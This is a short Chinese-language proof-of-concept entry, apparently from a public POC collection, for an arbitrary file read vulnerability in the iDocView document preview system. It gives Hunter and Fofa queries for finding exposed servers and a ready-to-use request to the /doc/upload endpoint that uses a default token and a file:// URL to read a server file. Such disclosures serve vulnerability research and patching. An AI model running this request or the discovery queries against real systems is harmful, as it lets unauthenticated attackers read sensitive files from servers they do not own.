# iDocView upload接口任意文件读取

>I Doc View在线文档预览系统是一套用于在Web环境中展示和预览各种文档类型的系统，如文本文档、电子表格、演示文稿、PDF文件等。

## 来源

[https://github.com/wy876/POC](https://github.com/wy876/POC/blob/d32f7fa15a779ac2032233799de698eb1c74b4d8/iDocView%20upload%E6%8E%A5%E5%8F%A3%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.md)

## 简介

I Doc View的/doc/upload接口处存在任意文件读取漏洞，未授权的攻击者可以利用此接口并携带默认token读取服务器敏感文件信息，使系统处于极度不安全的状态。

## 漏洞类型

-   任意文件读取 


## 资产测绘
```
Hunter语法：
app.name="I Doc View"
Fofa语法：
title="I Doc View"
```

## poc
```http
http://xxxxxx/doc/upload?token=testtoken&url=file:///C:/windows/win.ini&name=test.txt
```